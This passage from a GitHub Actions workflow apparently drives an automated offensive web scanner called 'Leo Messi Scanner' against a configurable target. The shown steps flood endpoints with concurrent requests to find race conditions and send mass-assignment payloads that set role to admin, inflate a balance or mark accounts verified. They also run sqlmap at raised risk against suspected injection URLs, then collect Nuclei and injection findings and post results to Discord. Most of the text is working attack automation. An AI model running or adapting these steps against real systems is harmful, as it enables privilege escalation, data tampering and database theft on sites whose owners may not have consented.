              with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
                  fs = [ex.submit(send) for _ in range(20)]
                  for f in concurrent.futures.as_completed(fs):
                      results.append(f.result())
              ok = sum(1 for r in results if r in [200, 201])
              fail = sum(1 for r in results if r in [409, 429])
              if ok > 0 and fail > 0:
                  findings.append(f"RACE: {url} | {ok} ok / {fail} fail")
          
          # Mass Assignment
          for url in eps[:2]:
              for payload in [{"role": "admin"}, {"balance": 999999}, {"verified": True}]:
                  try:
                      req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers=H, method="PUT")
                      resp = urllib.request.urlopen(req, timeout=10)
                      if resp.status == 200:
                          findings.append(f"MASS: {url} | {list(payload.keys())[0]}")
                  except: pass
          
          with open(os.path.join(rd, "race", "race_findings.txt"), "w") as f:
              f.write("\n".join(findings) if findings else "No findings\n")
          print(f"✅ Race/Mass: {len(findings)}")
          PYEOF

      - name: "🔬 Phase 6b: sqlmap"
        continue-on-error: true
        timeout-minutes: 15
        run: |
          RD="${{ env.RD }}"
          if ! command -v sqlmap &>/dev/null; then
            pip3 install sqlmap 2>/dev/null || true
          fi
          
          if command -v sqlmap &>/dev/null; then
            echo "sqlmap found, checking for targets..."
            GF_FILE="$RD/urls/gf_categorized.txt"
            if [ -s "$GF_FILE" ]; then
              grep '\[sqli\]' "$GF_FILE" | sed 's/^\[sqli\] //' | head -2 > /tmp/sqli_targets.txt
              while IFS= read -r url; do
                [ -z "$url" ] && continue
                sqlmap -u "$url" --batch --random-agent --level 2 --risk 2 \
                  --time-sec 8 --threads 4 --flush-session \
                  --output-dir="$RD/brute/sqlmap_$(echo $url | md5sum | cut -c1-8)" \
                  2>>"$RD/logs/sqlmap.log" > /dev/null 2>&1 || true
              done < /tmp/sqli_targets.txt
            fi
            echo "✅ sqlmap done"
          else
            echo "⚠️ sqlmap not available"
          fi

      # ─── PHASE 7: REPORT ───
      - name: "📋 Phase 7a: Triage"
        continue-on-error: true
        timeout-minutes: 3
        run: |
          python3 << 'PYEOF'
          import json, os
          rd = os.environ.get("RD", "results/test")
          
          confirmed = []
          
          # Nuclei
          nuclei_file = os.path.join(rd, "nuclei", "findings.jsonl")
          if os.path.exists(nuclei_file):
              with open(nuclei_file) as f:
                  for line in f:
                      try:
                          j = json.loads(line)
                          sev = j.get("info", {}).get("severity", "unknown").upper()
                          name = j.get("info", {}).get("name", j.get("template-id", ""))
                          host = j.get("host", j.get("matched-at", ""))
                          confirmed.append(f"[{sev}] Nuclei: {name} @ {host}")
                      except: pass
          
          # Injection
          inj_file = os.path.join(rd, "ai_agent", "injection_findings.json")
          if os.path.exists(inj_file):
              with open(inj_file) as f:
                  try:
                      for d in json.load(f):
                          sev = "HIGH" if d.get("vuln_class") in ["SQLi", "SSTI", "RCE"] else "MEDIUM"
                          confirmed.append(f"[{sev}] {d.get('vuln_class')}: {d.get('url','')[:120]}")
                  except: pass
          
          # Write triage
          os.makedirs(os.path.join(rd, "triage"), exist_ok=True)
          with open(os.path.join(rd, "triage", "triage.md"), "w") as f:
              f.write(f"# 🐐 Leo Messi Scanner\n**{len(confirmed)} findings**\n\n")
              for item in confirmed[:50]:
                  f.write(f"- {item}\n")
          
          print(f"✅ Triage: {len(confirmed)} findings")
          PYEOF

      - name: "📤 Upload Artifacts"
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: results-${{ env.TID }}-${{ env.TARGET }}
          path: ${{ env.RD }}/
          retention-days: 15

      - name: "📣 Discord Notification"
        if: always()
        continue-on-error: true
        timeout-minutes: 2
        run: |
          if [ -z "${{ env.DISCORD_WEBHOOK }}" ]; then
            echo "No Discord webhook configured"
            exit 0
          fi
          
          RD="${{ env.RD }}"
          SUBS=$(wc -l < "$RD/subdomains/all_subs.txt" 2>/dev/null || echo 0)
          LIVE=$(wc -l < "$RD/live/live.txt" 2>/dev/null || echo 0)
          NUC=$(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || echo 0)
          
          jq -n \
            --arg t "${{ env.TARGET }}" \
            --arg subs "$SUBS" \
            --arg live "$LIVE" \
            --arg nuc "$NUC" \
            --arg url "https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}" \
            '{
              username: "🐐 Leo Messi AI",
              embeds: [{
                title: "🐐 Leo Messi Scan Complete: " + $t,
                color: 5814783,
                url: $url,
                fields: [
                  {name: "🌐 Recon", value: "Subs: " + $subs + " | Live: " + $live, inline: false},
                  {name: "🔍 Findings", value: "Nuclei: " + $nuc, inline: false}
                ],
                footer: {text: "Leo Messi v4"}
              }]
            }' | curl -s -X POST "${{ env.DISCORD_WEBHOOK }}" -H "Content-Type: application/json" -d @- || true

      - name: "📊 Summary"
        if: always()
        run: |
          echo "╔══════════════════════════════════════════╗"
          echo "║ 🐐 LEO MESSI ULTIMATE v4               ║"
          echo "║ Target: ${{ env.TARGET }}              ║"
          echo "║ Mode:   ${{ env.HUNTING_MODE }}        ║"
          echo "╠══════════════════════════════════════════╣"
          for f in "${{ env.RD }}/subdomains/all_subs.txt" "${{ env.RD }}/live/live.txt" \
                   "${{ env.RD }}/urls/all_urls.txt" "${{ env.RD }}/nuclei/findings.jsonl"; do
            if [ -f "$f" ]; then
              echo "║ ✅ $(basename $f): $(wc -l < $f)"
            fi
          done
          echo "╚══════════════════════════════════════════╝"
